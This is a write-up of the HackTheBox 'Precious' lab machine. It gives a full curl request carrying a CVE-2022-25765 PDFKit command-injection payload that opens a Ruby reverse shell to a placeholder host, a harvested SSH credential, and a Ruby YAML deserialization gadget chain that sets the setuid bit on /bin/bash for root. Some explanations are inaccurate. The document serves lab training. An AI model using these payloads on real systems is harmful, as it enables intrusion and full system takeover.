![Image1](https://github.com/visionthex/Precious/blob/main/Images/image1.png)
[![Hackthebox](https://img.shields.io/badge/HackTheBox-111927?style=for-the-badge&logo=Hack%20The%20Box&logoColor=9FEF00)](https://hackthebox.com)

# HackTheBox: Precious Writeup

##  Precious
The initial phase involves conducting a comprehensive network scan to enumerate available ports. Based on the findings, the current port configuration reveals the presence of ports 22 and 80.

![Image2](https://github.com/visionthex/Precious/blob/main/Images/image2.png "Nmap Scan showing ports 22:80")

Upon completion of the scan, it was discovered that port 80 was hosting a web page accessible via the URL `http://precious.htb/`. In order to access the site, it will be necessary to add the aforementioned URL to the `/etc/hosts` file.

![Image3](https://github.com/visionthex/Precious/blob/main/Images/image3.png "http://precious.htb/")

![Image4](https://github.com/visionthex/Precious/blob/main/Images/image4.png "Adding IP to URL in /etc/hosts file")

Following the successful addition of the IP address and URL to the `/etc/hosts` file, I was able to gain access to the fully functional website. This enabled me to commence with the penetration testing phase, during which I will identify potential vulnerabilities and determine exploitability.

![Image5](https://github.com/visionthex/Precious/blob/main/Images/image5.png "The main webpage")

![Image6](https://github.com/visionthex/Precious/blob/main/Images/image6.png "Page source of URL")

The website features a search function that can be accessed via a specific URL. Upon testing the functionality, I discovered that it was possible to use various characters including `<, >, /../` to manipulate the URL and gain access to sensitive content. Specifically, I was able to obtain a PDF page.

![Image7](https://github.com/visionthex/Precious/blob/main/Images/image7.png "Traversal Methods 1")

![Image8](https://github.com/visionthex/Precious/blob/main/Images/image8.png "Traversal Methods 2")

![Image9](https://github.com/visionthex/Precious/blob/main/Images/image9.png "Traversal Methods 3")

After exploiting the path traversal vulnerability, I was able to access a PDF page containing sensitive information. However, when attempting to view the page, an error message was encountered that referenced PDFKIT v0.8.6. This suggests that the website is utilizing a Node.js module called PDFKIT to generate PDF documents. Further analysis is required to fully assess the potential impact of this vulnerability and its implications for the website's security.

![Image10](https://github.com/visionthex/Precious/blob/main/Images/image10.png "PDF page")

## Bug Report found in source code:
Upon inspecting the page source of the PDF page, I discovered a reference to Bug 1214658. This indicates the presence of a known bug, which may potentially provide additional vulnerabilities to exploit in the target system. Further investigation into this bug may be warranted in order to fully assess the system's security posture.

![Image11](https://github.com/visionthex/Precious/blob/main/Images/image11.png "BUG 1214658 (IFRAMES)")

![Image12](https://github.com/visionthex/Precious/blob/main/Images/image12.png "Bug Report")

Upon further investigation of Bug 1214658, I discovered that it was related to the Chrome browser and the website's API. However, I did not delve any deeper into this bug at this time. Further analysis of this bug may reveal additional vulnerabilities that could be exploited, and it may be worthwhile to revisit this issue in the future to assess its potential impact on the target system's security.

After successfully accessing the PDF page using the path traversal vulnerability, I attempted to view the page source and accessed the console to investigate the error message that had been encountered earlier. Through this process, I was able to identify the version of PDFKIT being used on the website.

![Image13](https://github.com/visionthex/Precious/blob/main/Images/image13.png "Console Error Message")

After identifying the [(CVE-2022-25765)](https://github.com/PurpleWaveIO/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell) vulnerability in PDFKIT v0.8.6, I exploited it by injecting a malicious code snippet into the website. To accomplish this, I set up a Python 3 HTTP server and a Netcat listener to receive the reverse shell connection. Then, using the `curl` command in the terminal on Linux, I sent the payload containing the code snippet to the website. This allowed me to gain remote access to the target system and execute arbitrary commands through the reverse shell connection.

```
curl 'TARGET-URL' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_URL' -H 'Connection: keep-alive' -H 'Referer: TARGET_URL' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-IP%3ALOCAL-HTTP-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-IP%22%2CLOCAL-LISTEN-PORT%29%29%27%60'
```
![Image14](https://github.com/visionthex/Precious/blob/main/Images/image14.png "Python3 -m http.server for Ruby script")

![Image15](https://github.com/visionthex/Precious/blob/main/Images/image15.png "Ncat Listener")

Once I established a reverse shell connection using Ncat, I verified my user account by running the `whoami` command and confirmed that I was logged in as `Ruby`. Now, the next step is to search for any credentials that may be useful for lateral movement within the target system. This may involve conducting a thorough analysis of the system and its configurations, and using various techniques such as privilege escalation, password cracking, and other methods to gain further access and control.

During the course of my reconnaissance, I examined the home directory of the 'Ruby' user and discovered a hidden folder. Upon closer inspection of the `.bundle` folder had a config file, I uncovered a username and password combination that can be used to establish an SSH connection to the target system. This represents a significant discovery, as it provides a potential avenue for deeper penetration and lateral movement within the system.

![Image16](https://github.com/visionthex/Precious/blob/main/Images/image16.png "Username and password")

`henry:Q3c1AqGHtoI0aXAYFH`

![Image17](https://github.com/visionthex/Precious/blob/main/Images/image17.png "Trying to see if I had permissions using the Ruby User")

Now that I have obtained a valid username and password combination, the next step in the pentesting process is to leverage this information to establish an SSH connection to the target system. This will enable me to gain a more comprehensive understanding of the system's architecture, configurations, and potential vulnerabilities, and to identify additional avenues for further exploitation and lateral movement.

![Image18](https://github.com/visionthex/Precious/blob/main/Images/image18.png "SSH session")

After gaining access to the system using the credentials obtained from the hidden file, the first order of business was to locate the user flag. With the flag successfully found, I proceeded to use the `sudo -l` command to investigate the low-level user's permissions within the system. This step is critical for identifying potential pathways to escalate privileges and expand my access within the system. By establishing the user's privileges, I can then craft a more effective strategy for further penetration and lateral movement within the system.

![Image19](https://github.com/visionthex/Precious/blob/main/Images/image19.png "Found the User Flag")

After investigating the low-level user's permissions using the `sudo -l` command, I discovered that the only executable I could run as root was `/usr/bin/ruby /opt/update_dependencies.rb`. This limited set of privileges means that I will need to be particularly strategic in determining how to leverage this access for further penetration and lateral movement within the system. It is a good starting point, however, and I will continue to explore and gather information to build a more comprehensive picture of the system's security architecture.

![Image20](https://github.com/visionthex/Precious/blob/main/Images/image20.png "Running the Sudo -l command on the low level user")

As I continued exploring the capabilities of the `/usr/bin/ruby /opt/update_dependencies.rb` executable, I discovered that it could run a YAML file. This opened up a potential avenue for exploitation using code injection. By crafting a malicious YAML file with injected code, I may be able to gain greater access to the system and execute commands with higher privileges. This will require careful crafting and testing of the exploit, as well as a thorough understanding of the system's security architecture and potential defenses against such attacks.

```
# Compare installed dependencies with those specified in "dependencies.yml
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end"
```
![Image21](https://github.com/visionthex/Precious/blob/main/Images/image21.png "adding the dependencies.yml using cat > command")

```
---
	- !ruby/object:Gem::Installer
	    i: x
	- !ruby/object:Gem::SpecFetcher
	    i: y
	- !ruby/object:Gem::Requirement
	  requirements:
	    !ruby/object:Gem::Package::TarReader
	    io: &1 !ruby/object:Net::BufferedIO
	      io: &1 !ruby/object:Gem::Package::TarReader::Entry
	         read: 0
	         header: "abc"
	      debug_output: &1 !ruby/object:Net::WriteAdapter
	         socket: &1 !ruby/object:Gem::RequestSet
	             sets: !ruby/object:Net::WriteAdapter
	                 socket: !ruby/module 'Kernel'
	                 method_id: :system

	             git_set: id <-- change this to "chmod +s /bin/bash"
	         method_id: :resolve-
```

I created a new file called dependencies.yml using the command `cat > dependencies.yml`. Then, I added the following code to the file:

`git_set: "chmod +s /bin/bash"`

This code makes the dependencies.yml file executable and runs a command that gives me root-level access to the system. With this code injection, I am able to exploit the update_dependencies.rb file and gain root access to the system. The YAML exploit used was from a [Github repo](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565?ref=stratum-security-blog#file-ruby_yaml_load_sploit2-yaml). The next step is to run the command with sudo.

![Image22](https://github.com/visionthex/Precious/blob/main/Images/image22.png "Running Sudo with /usr/bin/ruby /opt/update_dependencies.rb")

After running the command `sudo /usr/bin/ruby /opt/update_dependencies.rb`, I used the command `bash -p` to escalate privileges and gain root access with a bash shell.

![Image23](https://github.com/visionthex/Precious/blob/main/Images/image23.png "Root User")

Having obtained root access, the next step is to locate the root flag. This can be achieved by using commands such as `cd /root` to navigate to the root user's home directory and then `ls -a` to list all files, including hidden ones. Once the root flag is found, it can be displayed with the cat command.

![Image24](https://github.com/visionthex/Precious/blob/main/Images/image24.png "Root Flag")
